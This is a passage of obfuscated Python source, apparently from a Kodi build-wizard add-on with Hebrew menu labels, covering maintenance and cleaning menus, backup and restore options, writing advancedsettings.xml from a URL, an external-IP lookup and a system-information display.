		OOOOOOOOOO000OO00 ='true'if INCLUDESALTS =='true'else 'false'#line:3200
		O0O0OOO0OO000OOOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:3201
	O00O00OO0000O0O0O =wiz .getSize (PACKAGES )#line:3202
	OO0000O0000O000O0 =wiz .getSize (THUMBS )#line:3203
	OOOOO000OO00OO000 =wiz .getCacheSize ()#line:3204
	OO00OO000O000OO0O =O00O00OO0000O0O0O +OO0000O0000O000O0 +OOOOO000OO00OO000 #line:3205
	O00OOO00000OO00OO =['Daily','Always','3 Days','Weekly']#line:3206
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3207
	if view =="clean"or SHOWMAINT =='true':#line:3208
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO00OO000O000OO0O ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3209
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOOO000OO00OO000 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3210
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00OO0000O0O0O ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3211
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0000O0000O000O0 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3212
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3213
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3214
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3215
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3216
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3217
	if view =="addon"or SHOWMAINT =='false':#line:3218
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3219
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3220
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3221
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3222
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3223
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3224
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3225
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3226
	if view =="misc"or SHOWMAINT =='true':#line:3227
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3228
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3229
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3230
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3231
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3232
		addFile ('View Errors in Log: %s'%(O00000000OO0OOOOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3233
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3234
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3235
		addFile ('Clear Wizard Log File%s'%OO0O0O0000OOO0O0O ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3236
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3237
	if view =="backup"or SHOWMAINT =='true':#line:3238
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3239
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3240
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3241
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3242
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3243
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3244
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3245
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3246
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3247
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3248
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3249
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3250
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3251
	if view =="tweaks"or SHOWMAINT =='true':#line:3252
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3253
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3254
		else :#line:3255
			if os .path .exists (ADVANCED ):#line:3256
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3257
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3258
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3259
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3260
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3261
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3262
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3263
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3264
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3265
	addFile ('Show All Maintenance: %s'%OOOOOOO0O0OO0OO0O .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3266
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3267
	addFile ('Third Party Wizards: %s'%OO0O000OOO00000OO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3268
	if OO0O000OOO00000OO =='true':#line:3269
		OO0O000OO0O0OOO00 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3270
		O00O00O0O000O0O0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3271
		O00O0OOO0OOO00000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3272
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O000OO0O0OOO00 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3273
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O00O0O000O0O0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3274
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O0OOO0OOO00000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3275
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3276
	addFile ('ניקוי אוטומטי בהפעלה: %s'%OOO0OOO000O00OO0O .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3277
	if OOO0OOO000O00OO0O =='true':#line:3278
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00OOO00000OO00OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3279
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO000O00O0000O00O .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3280
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O0O000000OOO0OO00 .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3281
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O000OO0O000OOO000 .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3282
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3283
	addFile ('Include Video Cache in Clear Cache: %s'%OO00O0O000OO00O0O .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3284
	if OO00O0O000OO00O0O =='true':#line:3285
		addFile ('--- Include All Video Addons: %s'%OO0OOO0OO0OOOOO0O .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3286
		addFile ('--- Include Bob: %s'%OO00OO0O00OOOOOOO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3287
		addFile ('--- Include Phoenix: %s'%OOOOOOOO0OOO00OO0 .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3288
		addFile ('--- Include Specto: %s'%O0O00000000O0OOO0 .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3289
		addFile ('--- Include Exodus: %s'%OO0O0O0O0000OOOOO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3290
		addFile ('--- Include Salts: %s'%OOOOOOOOOO000OO00 .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3291
		addFile ('--- Include Salts HD Lite: %s'%O0O0OOO0OO000OOOO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3292
		addFile ('--- Include One Channel: %s'%OOOO0O00000000OOO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3293
		addFile ('--- Include Genesis: %s'%OOO0O0OOOOOOOOOOO .replace ('true',O0OO0000OOOOOOOOO ).replace ('false',OO00OO0O00OOOOOO0 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3294
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3295
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3296
	setView ('files','viewType')#line:3297
def advancedWindow (url =None ):#line:3299
	if not ADVANCEDFILE =='http://':#line:3300
		if url ==None :#line:3301
			O0OO0OOOOO0O0O00O =wiz .workingURL (ADVANCEDFILE )#line:3302
			O000O000OOO00O0O0 =uservar .ADVANCEDFILE #line:3303
		else :#line:3304
			O0OO0OOOOO0O0O00O =wiz .workingURL (url )#line:3305
			O000O000OOO00O0O0 =url #line:3306
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3307
		if os .path .exists (ADVANCED ):#line:3308
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3309
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3310
		if O0OO0OOOOO0O0O00O ==True :#line:3311
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:3312
			OO00OO0O0O00O0OO0 =wiz .openURL (O000O000OOO00O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3313
			O0O0O0O00OOO00OO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO00OO0O0O00O0OO0 )#line:3314
			if len (O0O0O0O00OOO00OO0 )>0 :#line:3315
				for O0O0O0OO000OO000O ,OOO00O00O00O0O000 ,url ,O0O00O00000OOOOOO ,O0O00O0OO000OO0O0 ,OO0O0OOOOO0OOO0O0 in O0O0O0O00OOO00OO0 :#line:3316
					if OOO00O00O00O0O000 .lower ()=="yes":#line:3317
						addDir ("[B]%s[/B]"%O0O0O0OO000OO000O ,'advancedsetting',url ,description =OO0O0OOOOO0OOO0O0 ,icon =O0O00O00000OOOOOO ,fanart =O0O00O0OO000OO0O0 ,themeit =THEME3 )#line:3318
					else :#line:3319
						addFile (O0O0O0OO000OO000O ,'writeadvanced',O0O0O0OO000OO000O ,url ,description =OO0O0OOOOO0OOO0O0 ,icon =O0O00O00000OOOOOO ,fanart =O0O00O0OO000OO0O0 ,themeit =THEME2 )#line:3320
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:3321
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O0OO0OOOOO0O0O00O )#line:3322
	else :wiz .log ("[Advanced Settings] not Enabled")#line:3323
def writeAdvanced (OO00OOOO0OO00OOO0 ,OO0O00OO00O000OO0 ):#line:3325
	OO0OOOO000O00O000 =wiz .workingURL (OO0O00OO00O000OO0 )#line:3326
	if OO0OOOO000O00O000 ==True :#line:3327
		if os .path .exists (ADVANCED ):OOOOO000OO000O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OOOO0OO00OOO0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:3328
		else :OOOOO000OO000O000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,OO00OOOO0OO00OOO0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:3329
		if OOOOO000OO000O000 ==1 :#line:3331
			O0OO000O000O0OO0O =wiz .openURL (OO0O00OO00O000OO0 )#line:3332
			OO0O0O000000OOOO0 =open (ADVANCED ,'w');#line:3333
			OO0O0O000000OOOO0 .write (O0OO000O000O0OO0O )#line:3334
			OO0O0O000000OOOO0 .close ()#line:3335
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:3336
			wiz .killxbmc (True )#line:3337
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:3338
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OO0OOOO000O00O000 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:3339
def viewAdvanced ():#line:3341
	O0O00O0OO0OOO000O =open (ADVANCED )#line:3342
	O0OO0000O0O0OO0O0 =O0O00O0OO0OOO000O .read ().replace ('\t','    ')#line:3343
	wiz .TextBox (ADDONTITLE ,O0OO0000O0O0OO0O0 )#line:3344
	O0O00O0OO0OOO000O .close ()#line:3345
def removeAdvanced ():#line:3347
	if os .path .exists (ADVANCED ):#line:3348
		wiz .removeFile (ADVANCED )#line:3349
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:3350
def showAutoAdvanced ():#line:3352
	notify .autoConfig ()#line:3353
def getIP ():#line:3355
	O0000000000000OOO ='http://whatismyipaddress.com/'#line:3356
	if not wiz .workingURL (O0000000000000OOO ):return 'Unknown','Unknown','Unknown'#line:3357
	OOOO00O0000OO0OOO =wiz .openURL (O0000000000000OOO ).replace ('\n','').replace ('\r','')#line:3358
	if not 'Access Denied'in OOOO00O0000OO0OOO :#line:3359
		OOOO00OOO00OO00OO =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (OOOO00O0000OO0OOO )#line:3360
		OOOOOOO0OO000O0O0 =OOOO00OOO00OO00OO [0 ]if (len (OOOO00OOO00OO00OO )>0 )else 'Unknown'#line:3361
		OO000OOO0OO0O00O0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (OOOO00O0000OO0OOO )#line:3362
		OO00OOOO0000OO00O =OO000OOO0OO0O00O0 [0 ]if (len (OO000OOO0OO0O00O0 )>0 )else 'Unknown'#line:3363
		OOOO0000O000000OO =OO000OOO0OO0O00O0 [1 ]+', '+OO000OOO0OO0O00O0 [2 ]+', '+OO000OOO0OO0O00O0 [3 ]if (len (OO000OOO0OO0O00O0 )>2 )else 'Unknown'#line:3364
		return OOOOOOO0OO000O0O0 ,OO00OOOO0000OO00O ,OOOO0000O000000OO #line:3365
	else :return 'Unknown','Unknown','Unknown'#line:3366
def systemInfo ():#line:3368
	O0OO000000O00O0O0 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:3382
	O0O0000O00O0OO0O0 =[];O00000OO0OOOO00O0 =0 #line:3383
	for OOO00O000000O00OO in O0OO000000O00O0O0 :#line:3384
		OO00OO0OO0O0O0OOO =wiz .getInfo (OOO00O000000O00OO )#line:3385
		O00OOO0OOOOOOO0O0 =0 #line:3386
		while OO00OO0OO0O0O0OOO =="Busy"and O00OOO0OOOOOOO0O0 <10 :#line:3387
			OO00OO0OO0O0O0OOO =wiz .getInfo (OOO00O000000O00OO );O00OOO0OOOOOOO0O0 +=1 ;wiz .log ("%s sleep %s"%(OOO00O000000O00OO ,str (O00OOO0OOOOOOO0O0 )));xbmc .sleep (1000 )#line:3388
		O0O0000O00O0OO0O0 .append (OO00OO0OO0O0O0OOO )#line:3389
		O00000OO0OOOO00O0 +=1 #line:3390
	O00OOO00O00OOOO00 =O0O0000O00O0OO0O0 [8 ]if 'Una'in O0O0000O00O0OO0O0 [8 ]else wiz .convertSize (int (float (O0O0000O00O0OO0O0 [8 ][:-8 ]))*1024 *1024 )#line:3391
	OO00O00OOOO00O00O =O0O0000O00O0OO0O0 [9 ]if 'Una'in O0O0000O00O0OO0O0 [9 ]else wiz .convertSize (int (float (O0O0000O00O0OO0O0 [9 ][:-8 ]))*1024 *1024 )#line:3392
	O0OOOOO00000OOOO0 =O0O0000O00O0OO0O0 [10 ]if 'Una'in O0O0000O00O0OO0O0 [10 ]else wiz .convertSize (int (float (O0O0000O00O0OO0O0 [10 ][:-8 ]))*1024 *1024 )#line:3393
	OO0OOO000O0O00000 =wiz .convertSize (int (float (O0O0000O00O0OO0O0 [11 ][:-2 ]))*1024 *1024 )#line:3394
	OO0OO0O0OO0OO0OO0 =wiz .convertSize (int (float (O0O0000O00O0OO0O0 [12 ][:-2 ]))*1024 *1024 )#line:3395
	OOOO0OOO0OOOOO0O0 =wiz .convertSize (int (float (O0O0000O00O0OO0O0 [13 ][:-2 ]))*1024 *1024 )#line:3396
	O0O00OOOOO0O000O0 ,OOOO0OO0000OO0OO0 ,OO0O0OO0O0OOOOO00 =getIP ()#line:3397
	OOO0000OO000000OO =[];OO0000OOOOO0O00OO =[];O0O0OOOOO00O00OOO =[];OO00O0O00O00O0000 =[];OO00OOOOO00O0O0OO =[];OO00000OO00O00OOO =[];O0O0O00OOOO0OO00O =[]#line:3399
	OOO00000OO00O0O00 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3401
	for O0OOO00OOOO00OO00 in sorted (OOO00000OO00O0O00 ,key =lambda O0OOOO000000OO0OO :O0OOOO000000OO0OO ):#line:3402
		OO000OO000O0OOOOO =os .path .split (O0OOO00OOOO00OO00 [:-1 ])[1 ]#line:3403
		if OO000OO000O0OOOOO =='packages':continue #line:3404
		OO00O00000000OO00 =os .path .join (O0OOO00OOOO00OO00 ,'addon.xml')#line:3405
		if os .path .exists (OO00O00000000OO00 ):#line:3406
			O0OO0000OOOOO000O =open (OO00O00000000OO00 )#line:3407
			OO00O0O0O00OO0O0O =O0OO0000OOOOO000O .read ()#line:3408
			O0OOOOO000OOOOO00 =re .compile ("<provides>(.+?)</provides>").findall (OO00O0O0O00OO0O0O )#line:3409
			if len (O0OOOOO000OOOOO00 )==0 :#line:3410
				if OO000OO000O0OOOOO .startswith ('skin'):O0O0O00OOOO0OO00O .append (OO000OO000O0OOOOO )#line:3411
				if OO000OO000O0OOOOO .startswith ('repo'):OO00OOOOO00O0O0OO .append (OO000OO000O0OOOOO )#line:3412
				else :OO00000OO00O00OOO .append (OO000OO000O0OOOOO )#line:3413
			elif not (O0OOOOO000OOOOO00 [0 ]).find ('executable')==-1 :OO00O0O00O00O0000 .append (OO000OO000O0OOOOO )#line:3414
			elif not (O0OOOOO000OOOOO00 [0 ]).find ('video')==-1 :O0O0OOOOO00O00OOO .append (OO000OO000O0OOOOO )#line:3415
			elif not (O0OOOOO000OOOOO00 [0 ]).find ('audio')==-1 :OO0000OOOOO0O00OO .append (OO000OO000O0OOOOO )#line:3416
			elif not (O0OOOOO000OOOOO00 [0 ]).find ('image')==-1 :OOO0000OO000000OO .append (OO000OO000O0OOOOO )#line:3417
	addFile ('[B]Media Center Info:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3419
	addFile ('[COLOR %s]Name:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [0 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3420
	addFile ('[COLOR %s]Version:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [1 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3421
	addFile ('[COLOR %s]Platform:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,wiz .platform ().title ()),'',icon =ICONMAINT ,themeit =THEME3 )#line:3422
	addFile ('[COLOR %s]CPU Usage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [2 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3423
	addFile ('[COLOR %s]Screen Mode:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [3 ]),'',icon =ICONMAINT ,themeit =THEME3 )#line:3424
	addFile ('[B]Uptime:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3426
	addFile ('[COLOR %s]Current Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [6 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3427
	addFile ('[COLOR %s]Total Uptime:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [7 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3428
	addFile ('[B]Local Storage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3430
	addFile ('[COLOR %s]Used Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O00OOO00O00OOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3431
	addFile ('[COLOR %s]Free Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00OOOO00O00O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3432
	addFile ('[COLOR %s]Total Storage:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOOOO00000OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3433
	addFile ('[B]Ram Usage:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3435
	addFile ('[COLOR %s]Used Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OOO000O0O00000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3436
	addFile ('[COLOR %s]Free Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0OO0O0OO0OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3437
	addFile ('[COLOR %s]Total Memory:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OOO0OOOOO0O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3438
	addFile ('[B]Network:[/B]','',icon =ICONMAINT ,themeit =THEME2 )#line:3440
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3441
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O00OOOOO0O000O0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3442
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOOO0OO0000OO0OO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3443
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0OO0O0OOOOO00 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3444
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0O0000O00O0OO0O0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:3445
	O0OO000OO00O000OO =len (OOO0000OO000000OO )+len (OO0000OOOOO0O00OO )+len (O0O0OOOOO00O00OOO )+len (OO00O0O00O00O0000 )+len (OO00000OO00O00OOO )+len (O0O0O00OOOO0OO00O )+len (OO00OOOOO00O0O0OO )#line:3447
	addFile ('[B]Addons([COLOR %s]%s[/COLOR]):[/B]'%(COLOR1 ,O0OO000OO00O000OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:3448
	addFile ('[COLOR %s]Video Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (O0O0OOOOO00O00OOO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3449
	addFile ('[COLOR %s]Program Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00O0O00O00O0000 ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3450
	addFile ('[COLOR %s]Music Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO0000OOOOO0O00OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3451
	addFile ('[COLOR %s]Picture Addons:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OOO0000OO000000OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3452
	addFile ('[COLOR %s]Repositories:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,str (len (OO00OOOOO00O0O0OO ))),'',icon =ICONMAINT ,themeit =THEME2 )#line:3453
